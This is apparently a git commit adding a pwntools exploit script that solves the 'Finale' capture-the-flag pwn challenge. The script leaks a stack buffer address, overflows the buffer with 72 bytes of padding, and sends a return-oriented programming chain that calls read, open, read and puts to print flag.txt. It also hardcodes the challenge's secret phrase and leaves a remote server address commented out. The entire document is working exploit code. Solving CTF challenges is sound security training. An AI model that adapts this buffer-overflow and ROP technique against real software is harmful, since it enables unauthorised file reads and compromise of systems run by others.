f62d011a06518d21b5d9705ce3ccd663693d3d41
ShundaZhang <zhangshunda@gmail.com>
2023-01-17 22:37:49 +0800

    Solving Finale...

---
+++ ctf/pwn/Finale/dec.py
@@ -0,0 +1,47 @@
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+io = process('./finale')
+#ip, port = '161.35.162.53', 30362
+#io = remote(ip, port)
+
+elf = ELF('./finale')
+
+io.sendlineafter('tell us the secret phrase:', 's34s0nf1n4l3b00')
+io.recvuntil('good luck: ')
+buf_addr = p64(int(io.recvuntil('\n').split('[')[1].split(']')[0], 16))
+#print hex(u64(buf_addr))
+
+pop_rdi_ret = 0x00000000004012d6
+pop_rsi_ret = 0x00000000004012d8
+
+padding = 'A'*(64+8)
+payload = padding
+#read ./flag.txt from stdin to stack
+payload += p64(pop_rdi_ret)
+payload += p64(0)
+payload += p64(pop_rsi_ret)
+payload += buf_addr
+payload += p64(elf.sym.read)
+#open ./flag.txt
+payload += p64(pop_rdi_ret)
+payload += buf_addr
+payload += p64(pop_rsi_ret)
+payload += p64(0)
+payload += p64(elf.sym.open)
+#read flag into stack
+payload += p64(pop_rdi_ret)
+payload += p64(3)
+payload += p64(pop_rsi_ret)
+payload += buf_addr
+payload += p64(elf.sym.read)
+#puts the flag
+payload += p64(pop_rdi_ret)
+payload += buf_addr
+payload += p64(elf.sym.puts)
+
+io.sendlineafter('tell us a wish for next year:', payload)
+print io.recvall()
+
